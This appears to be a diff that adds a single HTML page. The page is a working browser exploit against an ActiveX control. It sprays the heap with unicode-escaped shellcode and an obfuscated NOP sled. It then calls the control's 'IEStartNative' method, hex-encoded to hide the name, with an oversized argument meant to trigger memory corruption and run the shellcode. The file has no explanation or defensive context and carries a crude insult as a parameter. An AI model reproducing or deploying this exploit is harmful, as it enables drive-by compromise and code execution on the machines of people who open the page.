@@ -1,0 +1,20 @@
+<html>
+<object classid="clsid:F917534D-535B-416B-8E8F-0C04756C31A8" id='target'></object>
+<body>
+<SCRIPT language="JavaScript">
+var hellohack = "%ubebd%u499f%u2979%ub1c9%uda5d%ud9c7%u2474%u5af4%u6a31%u8310%u04c2%u6a03%u5c0c%ua26a%ufa69%u06df%u9c43%u5466%ue052%uafad%u02cd%u4437%u2ae8%u6423%u550c%ud7c4%u306a%u2bbc%u7a71%u3216%ue313%u9c7a%u01b1%u9b92%u378e%u35bd%u76fc%udc2f%u6aa4%ua7a2%u1046%uba56%u9d6f%ud83d%u0a7d%ub7cc%u7bf6%u0f01%u25e4%uf204%u421b%u64ca%ufedb%u6613%u3e4d%u62ad%u2330%ue8ee%u9bbc%uc8c9%u4f2f%u09c4%uf5f2%ufdb2%u9375%u541b%u5cd5%u3989%u7dc4%ua32b%ud9b3%u4f4c%u81d9%uf6be%u6b44%u6bad%ue56b%u34cb%ueb1c%u39a2%ucbbf%u7744%u5259%u9d3f%uf005%u6d8b%u36df%ub16e%u8732%uad82%u76f3%u57c1%ue16a%u3713%ude07%udefb%uf9b0%u82ef%u56a7%u83f6%uddc2%u1eb0%ueeb6%ud47a%ude5e%ub708%u4403%ubf37%u848b%u9de6%ue96e%ue2f6%u8816%u4353%u63e0%ubb69%u153b%u21a0%u9cae%u60f5%ud0a8%ubc6f%u2253%u9402%u8fc5%ub1c1%u8f19%u8a31%u852d%u46a4%ud971%u221b%u7302%u8e02%u3c9d%u48d3%u9c38%u78e0%ucb0d%u79ef%uf656%u95ed%ue29b%uf3e4%u0eba%uc915%u04a3%u320b%u05d7%u2024%u4fe4%u4128%u4ffe%u376b%u7fcf%u947b%u8331%ubc7e%u9a6e%u528f%uad43%u519b%ub0a4%u7fc5%ub2a3%uaa0b%ub9bc%uad1f%uddd6%ud738%uf6c5%u1c4c%uffe3%u1136%u2ac7%u5c95%u2336%u57d3%u363f%u6ed1%u381f%u721f%u2178%uff88%u210d%u2f73%ua2c1%u01e9%u4769%u329e%ue1f7%uae70%u8098%u54a3%u2d08%ubad2%ua9b3%u434f%u9031";
+var shellcode = unescape(hellohack);
+var nop = "tmp9090tmp9090";
+var dsffsgdfg = unescape(nop.replace(/tmp/g,"%u"));
+while (dsffsgdfg.length<224) dsffsgdfg+=dsffsgdfg;
+fillvcbcv = dsffsgdfg.substring(0, 224);
+vcbcv = dsffsgdfg.substring(0, dsffsgdfg.length-224);
+while(vcbcv.length+224<0x40000) vcbcv = vcbcv+vcbcv+fillvcbcv;
+gdfgdh = new Array();
+for (x=0; x<300; x++) gdfgdh[x] = vcbcv +shellcode;
+var hellohack = '';
+while (hellohack.length < 600) hellohack+='\x0a\x0a\x0a\x0a';
+target["\x49\x45\x53\x74\x61\x72\x74\x4e\x61\x74\x69\x76\x65"](hellohack,"wahahah","fuckyou");
+</script>
+</body>
+</html>
